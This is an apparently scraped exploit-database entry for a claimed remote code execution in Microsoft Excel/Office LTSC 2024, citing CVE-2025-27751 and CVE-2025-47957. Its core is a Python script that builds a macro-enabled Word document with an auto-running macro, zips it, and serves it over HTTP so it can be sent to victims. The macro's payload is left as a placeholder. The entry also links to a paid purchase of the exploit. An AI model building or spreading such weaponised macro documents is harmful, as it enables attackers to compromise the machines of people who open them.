@@ -1,0 +1,226 @@
+---
+title: Microsoft Excel LTSC 2024 Remote Code Execution
+url: https://cxsecurity.com/issue/WLB-2025070040
+source: CXSECURITY Database RSS Feed - CXSecurity.com
+date: 2025-08-01
+fetch_date: 2025-10-07T00:14:44.764029
+---
+
+# Microsoft Excel LTSC 2024 Remote Code Execution
+
+[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)
+
+* [Home](https://cxsecurity.com/)
+* Bugtraq
+  + [Full List](https://cxsecurity.com/wlb/)
+  + [Only Bugs](https://cxsecurity.com/bugs/)
+  + [Only Tricks](https://cxsecurity.com/tricks/)
+  + [Only Exploits](https://cxsecurity.com/exploit/)
+  + [Only Dorks](https://cxsecurity.com/dorks/)
+  + [Only CVE](https://cxsecurity.com/cvelist/)
+  + [Only CWE](https://cxsecurity.com/cwelist/)
+  + [Fake Notes](https://cxsecurity.com/bogus/)
+  + [Ranking](https://cxsecurity.com/best/1/)
+* CVEMAP
+  + [Full List](https://cxsecurity.com/cvemap/)
+  + [Show Vendors](https://cxsecurity.com/cvevendors/)
+  + [Show Products](https://cxsecurity.com/cveproducts/)
+  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
+  + [Check CVE Id](https://cxsecurity.com/cve/)
+  + [Check CWE Id](https://cxsecurity.com/cwe/)
+* Search
+  + [Bugtraq](https://cxsecurity.com/search/)
+  + [CVEMAP](https://cxsecurity.com/search/cve/)
+  + [By author](https://cxsecurity.com/search/author/)
+  + [CVE Id](https://cxsecurity.com/cve/)
+  + [CWE Id](https://cxsecurity.com/cwe/)
+  + [By vendors](https://cxsecurity.com/cvevendors/)
+  + [By products](https://cxsecurity.com/cveproducts/)
+* RSS
+  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
+  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
+  + [CVE Products](https://cxsecurity.com/cveproducts/)
+  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
+  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
+  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
+* More
+  + [cIFrex](http://cifrex.org/)
+  + [Facebook](https://www.facebook.com/cxsec)
+  + [Twitter](https://twitter.com/cxsecurity)
+  + [Donate](https://cxsecurity.com/donate/)
+  + [About](https://cxsecurity.com/wlb/about/)
+
+* [Submit](https://cxsecurity.com/wlb/add/)
+
+|  |  |  |  |
+| --- | --- | --- | --- |
+|  |  | |  | | --- | | **Microsoft Excel LTSC 2024 Remote Code Execution** **2025.07.31**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-27751](https://cxsecurity.com/cveshow/CVE-2025-27751/ "Click to see CVE-2025-27751")** | **[CVE-2025-47957](https://cxsecurity.com/cveshow/CVE-2025-47957/ "Click to see CVE-2025-47957")**  CWE: **N/A** | |
+
+# Titles: Microsoft Excel LTSC 2024 - Remote Code Execution (RCE)
+# Author: nu11secur1ty
+# Date: 06/16/2025
+# Vendor: Microsoft
+# Software: https://www.microsoft.com/en/microsoft-365/excel?market=af
+# Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-27751
+# CVE-2025-47957
+# Versions: Microsoft Office LTSC 2024 , Microsoft Office LTSC 2021, Microsoft 365 Apps for Enterprise
+## Description:
+The attacker can trick any user into opening and executing their code by
+sending a malicious DOCX file via email or a streaming server. After the
+execution of the victim, his machine can be infected or even worse than
+ever; this could be the end of his Windows machine! WARNING: AMPOTATE THE
+MACROS OPTIONS FROM YOUR OFFICE 365!!!
+STATUS: HIGH-CRITICAL Vulnerability
+[+]Exploit:
+```
+#!/usr/bin/python
+# CVE-2025-47957 by nu11secur1ty
+import os
+import time
+import zipfile
+import threading
+import http.server
+import socket
+import socketserver
+import win32com.client
+def get\_local\_ip():
+"""Get the LAN IP address of the current machine."""
+try:
+s = socket.socket(socket.AF\_INET, socket.SOCK\_DGRAM)
+s.connect(("8.8.8.8", 80)) # External DNS, just for routing
+ip = s.getsockname()[0]
+s.close()
+return ip
+except:
+return "127.0.0.1"
+def create\_docm\_with\_auto\_macro(filename):
+script\_dir = os.path.dirname(os.path.abspath(\_\_file\_\_))
+full\_path = os.path.join(script\_dir, filename)
+word = win32com.client.Dispatch("Word.Application")
+word.Visible = False
+doc = word.Documents.Add()
+doc.Content.Text = "This document contains an auto-starting macro."
+vbproject = doc.VBProject
+vbcomponent = vbproject.VBComponents.Add(1) # Standard Module
+macro\_code = '''
+Sub AutoOpen()
+Call YOUR\_PoC
+End Sub
+Sub YOUR\_PoC()
+Dim Program As String
+Dim TaskID As Double
+On Error Resume Next
+Program = "YOUR\_EXPLOIT\_HERE"
+TaskID = YOUR\_TASK\_HERE
+If Err <> 0 Then
+MsgBox "Can't start " & Program
+End If
+End Sub
+'''
+vbcomponent.CodeModule.AddFromString(macro\_code)
+wdFormatXMLDocumentMacroEnabled = 13
+doc.SaveAs(full\_path, FileFormat=wdFormatXMLDocumentMacroEnabled)
+doc.Close()
+word.Quit()
+print(f"[+] Macro-enabled .docm saved at: {full\_path}")
+return full\_path
+def compress\_to\_zip(filepath):
+zip\_path = filepath + '.zip'
+with zipfile.ZipFile(zip\_path, 'w') as zipf:
+zipf.write(filepath, arcname=os.path.basename(filepath))
+print(f"[+] Compressed to ZIP: {zip\_path}")
+return zip\_path
+def start\_http\_server(directory, port=8000):
+os.chdir(directory)
+handler = http.server.SimpleHTTPRequestHandler
+httpd = socketserver.TCPServer(("", port), handler)
+ip = get\_local\_ip()
+print(f"[+] HTTP server running at: http://{ip}:{port}/")
+thread = threading.Thread(target=httpd.serve\_forever)
+thread.daemon = True
+thread.start()
+return httpd
+if \_\_name\_\_ == "\_\_main\_\_":
+filename = "CVE-2025-47957.docm"
+docm\_path = create\_docm\_with\_auto\_macro(filename)
+zip\_path = compress\_to\_zip(docm\_path)
+server = start\_http\_server(os.path.dirname(docm\_path))
+try:
+print("[\*] Server running — press Ctrl+C to stop...")
+while True:
+time.sleep(1)
+except KeyboardInterrupt:
+print("\n[!] Ctrl+C detected — shutting down server...")
+server.shutdown()
+print("[+] The Exploit Server stopped. Goodbye!")
+```
+# Reproduce:
+[href](https://www.youtube.com/watch?v=r4NsGrO56yo)
+# Buy an exploit only:
+[href](https://satoshidisk.com/pay/COeJqt)
+# Time spent:
+01:37:00
+--
+System Administrator - Infrastructure Engineer
+Penetration Testing Engineer
+Exploit developer at https://packetstormsecurity.com/
+https://cve.mitre.org/index.html
+https://cxsecurity.com/ and https://www.exploit-db.com/
+0day Exploit DataBase https://0day.today/
+home page: https://www.nu11secur1ty.com/
+hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
+nu11secur1ty <http://nu11secur1ty.com/>
+--
+System Administrator - Infrastructure Engineer
+Penetration Testing Engineer
+Exploit developer at https://packetstorm.news/
+https://cve.mitre.org/index.html
+https://cxsecurity.com/ and https://www.exploit-db.com/
+0day Exploit DataBase https://0day.today/
+home page: https://www.nu11secur1ty.com/
+hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
+nu11secur1ty <http://nu11secur1ty.com/>
+
+[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025070040)
+
+[Tweet](https://twitter.com/share)
+
+Vote for this issue:
+ 2
+ 0
+
+100%
+
+0%
+
+#### **Thanks for you vote!**
+
+#### **Thanks for you comment!** Your message is in quarantine 48 hours.
+
+Comment it here.
+
+Nick (\*)
+
+Email (\*)
+
+Video
+
+Text (\*)
+
+(\*) - required fields.
+Cancel
+Submit
+
+|  |  |
+| --- | --- |
+|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |
+
+Show all comments
+
+---
+
+Copyright **2025**, cxsecurity.com
+
+|  |
+
+Back to Top
